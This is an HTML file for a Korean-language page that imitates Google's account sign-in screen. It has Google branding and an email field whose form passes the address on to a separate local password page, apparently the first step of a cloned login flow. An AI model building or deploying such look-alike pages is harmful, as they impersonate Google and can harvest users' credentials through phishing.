<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/static/login.css">
    <title>로그인 - Google 계정</title>
</head>
<body>
    <div id="container">
        <div class="logo">
            <img src="/static/logo.png" alt="">
        </div>
        <h1>로그인</h1>
        <h2>Google 계정 사용</h2>
        <br>
        <div class="forget">
            <form method="GET" action="/templates/password.html">

                <input id="email"
                placeholder=""
                type="email"
                pattern="[a-zA-Z0-9]+[@][a-zA-Z0-9]+[.]+[a-zA-Z]+[.]*[a-zA-Z]*"
                autocomplete="off"
                name="email"
                oninvalid="this.setCustomValidity('올바른 이메일을 입력하세요.')"
                required>

                <input id="submit"
                type="submit"
                value="다음">
                
            </form>

            <!-- <div class="placeholder">이메일 또는 휴대전화</div> -->
            <a href="#">이메일을 잊으셨나요?</a>
        </div>
        <div class="guest">
            <p>내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요. <a href="#">자세히 알아보기</a></p>
        </div>
        <div class="account">
            <a href="#">계정 만들기</a>
        </div>
    </div>
    
    <footer>
        <!-- <select name="language" id="language">
            <option value="ko">한국어</option>
            <option value="en">English</option>
            <option value="jp">日本語</option>
            <option value="ch">繁體中文</option>
        </select> -->
        <a href="#">도움말</a>
        <a href="#">개인정보처리방침</a>
        <a href="#">약관</a>
    </footer>
    
    <script src="/script.js"></script>
</body>
</html>
